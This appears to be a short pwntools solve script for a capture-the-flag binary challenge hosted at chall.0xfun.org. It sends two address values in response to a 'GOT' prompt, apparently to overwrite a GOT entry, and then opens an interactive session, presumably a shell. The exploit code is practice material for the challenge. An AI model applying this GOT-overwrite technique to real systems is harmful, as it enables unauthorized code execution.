from pwn import *

#p = process('./chall')
p= remote('chall.0xfun.org','52769')

p.recvuntil("GOT!")
p.sendline(b"4207664")

p.recvuntil("I want to see what you GOT!")

p.sendline(b"4198966")

p.interactive()
